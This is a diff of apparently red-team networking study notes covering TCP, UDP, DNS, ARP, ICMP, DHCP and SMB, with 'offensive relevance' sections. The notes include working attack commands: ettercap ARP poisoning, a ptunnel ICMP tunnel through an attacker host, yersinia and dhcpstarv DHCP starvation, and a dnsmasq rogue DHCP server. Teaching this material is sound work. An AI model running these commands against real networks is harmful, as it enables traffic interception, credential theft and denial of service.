@@ -1,12 +1,8 @@
----
-hidden: true
----
-
 # Core Protocols
 
-**TCP — Transmission Control Protocol**
+**TCP: Transmission Control Protocol**
 
-TCP provides reliable, ordered, connection-oriented communication. It guarantees delivery by acknowledging received data and retransmitting what's lost.
+TCP provides reliable, ordered, connection-oriented communication. It guarantees delivery by acknowledging (lol ACK) received data and retransmitting what's lost.
 
 **The Three-Way Handshake:**
 
@@ -16,7 +12,7 @@ Client ← [SYN-ACK]    ← Server    "OK, my seq is Y, I acknowledge X+1"
 Client → [ACK]         → Server    "I acknowledge Y+1 — connection open"
 ```
 
-Each side maintains a **sequence number** tracking bytes sent. These are initialized with a random **ISN (Initial Sequence Number)** — modern systems randomize this to prevent prediction attacks, though embedded and legacy systems sometimes don't.
+Each side maintains a **sequence number** tracking bytes sent. These are initialized with a random **ISN (Initial Sequence Number)** \[modern systems randomize this to prevent prediction attacks, though embedded and legacy systems sometimes don't.]
 
 **TCP connection teardown (four-way):**
 
@@ -43,9 +39,9 @@ Client → [ACK]    "Got it — connection closed"
 * **SYN scanning** sends SYN packets and reads responses without completing the handshake. SYN-ACK = open. RST = closed. No response = filtered.
 * **RST injection** abruptly terminates established sessions — useful for DoS or session disruption
 * **SYN floods** overwhelm a target's connection table with half-open connections, exhausting resources
-* **TCP sequence prediction** was historically exploitable on systems with predictable ISNs — still a concern on embedded/legacy devices
+* **TCP sequence prediction** was historically exploitable on systems with predictable ISNs
 
-**UDP — User Datagram Protocol**
+**UDP: User Datagram Protocol**
 
 UDP is connectionless. No handshake, no acknowledgment, no ordering, no retransmission. Just send and hope. Fast, low-overhead, but unreliable.
 
@@ -53,7 +49,7 @@ Services that use UDP: DNS (53), DHCP (67/68), SNMP (161), TFTP (69), NTP (123),
 
 **Offensive relevance:**
 
-* UDP scanning is slow and unreliable — no response could mean open (the application is ignoring the UDP probe), filtered, or packet loss
+* UDP scanning is slow and unreliable: no response could mean open (the application is ignoring the UDP probe), filtered, or packet loss
 * UDP services are often less hardened and monitored than TCP equivalents
 * SNMP on UDP 161 with community string `public` is a classic finding
 * UDP-based services often lack authentication by design (NTP, syslog)
@@ -68,9 +64,9 @@ nmap -sU -p 53,67,68,69,123,161,500 192.168.1.1
 nmap -sU --top-ports 20 192.168.1.0/24
 ```
 
-**DNS — Domain Name System**
+**DNS: Domain Name System**
 
-DNS is a distributed hierarchical database that maps domain names to IP addresses (and much more). It's fundamental infrastructure — almost everything depends on it.
+DNS is a distributed hierarchical database that maps domain names to IP addresses (and much more). It's fundamental infrastructure.. almost everything depends on it.
 
 **How resolution works:**
 
@@ -86,17 +82,17 @@ Returns: google.com → 142.250.80.46
 
 **Record types:**
 
-| Record | Purpose          | Red team relevance                                               |
-| ------ | ---------------- | ---------------------------------------------------------------- |
-| A      | IPv4 address     | Primary target for enumeration                                   |
-| AAAA   | IPv6 address     | Often overlooked, may reveal more hosts                          |
-| MX     | Mail server      | Identifies mail infrastructure                                   |
-| NS     | Nameserver       | Primary target for zone transfer attempts                        |
-| CNAME  | Alias            | May reveal internal/staging hostnames                            |
-| TXT    | Arbitrary text   | SPF, DKIM, domain verification tokens — often leak internal info |
-| PTR    | Reverse lookup   | IP → name — reveals hostnames for known IPs                      |
-| SOA    | Zone authority   | Serial numbers, admin email, refresh intervals                   |
-| SRV    | Service location | Reveals internal services (used heavily in AD)                   |
+| Record | Purpose          | Red team relevance                                                           |
+| ------ | ---------------- | ---------------------------------------------------------------------------- |
+| A      | IPv4 address     | Primary target for enumeration                                               |
+| AAAA   | IPv6 address     | Often overlooked, may reveal more hosts                                      |
+| MX     | Mail server      | Identifies mail infrastructure                                               |
+| NS     | Nameserver       | Primary target for zone transfer attempts                                    |
+| CNAME  | Alias            | May reveal internal/staging hostnames                                        |
+| TXT    | Arbitrary text   | <p>SPF, DKIM, domain verification tokens </p><p>often leak internal info</p> |
+| PTR    | Reverse lookup   | <p>IP → name </p><p>reveals hostnames for known IPs</p>                      |
+| SOA    | Zone authority   | Serial numbers, admin email, refresh intervals                               |
+| SRV    | Service location | Reveals internal services (used heavily in AD)                               |
 
 **Offensive techniques:**
 
@@ -225,11 +221,11 @@ Content-Length: 42                    ← Length of body
 | `Content-Security-Policy`   | Response  | Absence or weak policy is a finding                    |
 | `Strict-Transport-Security` | Response  | Absence allows SSL stripping                           |
 
-**HTTPS/TLS:** HTTPS is HTTP inside TLS. TLS encrypts the payload but the **SNI (Server Name Indication)** in the ClientHello is still visible to network observers — they can see which domain you're connecting to even without decrypting the session.
+**HTTPS/TLS:** HTTPS is HTTP inside TLS. TLS encrypts the payload but the **SNI (Server Name Indication)** in the ClientHello is still visible to network observers... they can see which domain you're connecting to even without decrypting the session.
 
 TLS attack surface: expired or self-signed certificates, weak cipher suites (RC4, DES, export ciphers), old protocol versions (SSLv3, TLS 1.0/1.1), SSL stripping (when HSTS is absent), certificate mismatches indicating proxying/inspection.
 
-**ARP — Address Resolution Protocol**
+**ARP:Address Resolution Protocol**
 
 ARP maps IP addresses to MAC addresses on a local network. When your machine wants to send a packet to `192.168.1.1`, it first needs to know the MAC address for that IP so it can construct the Ethernet frame.
 
@@ -243,7 +239,7 @@ Host A:  Caches the mapping, sends the frame
 
 ARP cache entries expire after a few minutes.
 
-**The fundamental flaw:** ARP is stateless and completely unauthenticated. Any host can send an **unsolicited gratuitous ARP reply** claiming any IP-to-MAC mapping. There is no verification mechanism. This is by design — it was created for speed and simplicity on trusted LANs. The trust model has been completely wrong for 40 years.
+**The fundamental flaw:** ARP is stateless and completely unauthenticated. Any host can send an **unsolicited gratuitous ARP reply** claiming any IP-to-MAC mapping. There is no verification mechanism. This is by design, it was created for speed and simplicity on trusted LANs. The trust model has been completely wrong for 40 years.
 
 **ARP spoofing / ARP poisoning:**
 
@@ -279,7 +275,7 @@ ettercap -T -i eth0 -M arp:remote /192.168.1.1// /192.168.1.50//
 
 From this MitM position: capture plaintext credentials, harvest NTLM hashes for relay or cracking, downgrade HTTPS (if no HSTS), inject content into HTTP traffic.
 
-**ICMP — Internet Control Message Protocol**
+**ICMP: Internet Control Message Protocol**
 
 ICMP is a Layer 3 protocol used for diagnostics, error reporting, and network management. It rides inside IP packets (protocol number 1).
 
@@ -325,7 +321,7 @@ ptunnel -p <attacker_ip> -lp 8080 -da <target_ip> -dp 22
 ssh -p 8080 user@localhost
 ```
 
-**DHCP — Dynamic Host Configuration Protocol**
+**DHCP: Dynamic Host Configuration Protocol**
 
 DHCP automatically assigns network configuration to clients: IP address, subnet mask, default gateway, DNS servers, lease duration.
 
@@ -342,7 +338,7 @@ Note that Discover and Request are broadcast — every host on the segment sees 
 
 **Attacks:**
 
-_DHCP Starvation_ — flood the network with DISCOVER messages using spoofed source MACs, exhausting the IP pool. Legitimate clients get no addresses.
+_DHCP Starvation_: flood the network with DISCOVER messages using spoofed source MACs, exhausting the IP pool. Legitimate clients get no addresses.
 
 bash
 
@@ -354,7 +350,7 @@ yersinia dhcp -attack 1 -interface eth0
 dhcpstarv -i eth0
 ```
 
-_Rogue DHCP Server_ — set up your own DHCP server. Whoever responds faster than the legitimate server wins. You control what gateway and DNS server victims get — instant MitM positioning without any ARP spoofing.
+_Rogue DHCP Server_: set up your own DHCP server. Whoever responds faster than the legitimate server wins. You control what gateway and DNS server victims get= instant MitM positioning without any ARP spoofing.
 
 bash
 
@@ -367,7 +363,7 @@ dnsmasq --interface=eth0 \
         --no-daemon
 ```
 
-**SMB — Server Message Block**
+**SMB: Server Message Block**
 
 SMB is Windows' native file sharing protocol, running on TCP port 445. It's one of the most exploited protocols in Windows environments because it's everywhere, it's trusted, and it's been the source of catastrophic vulnerabilities.
 
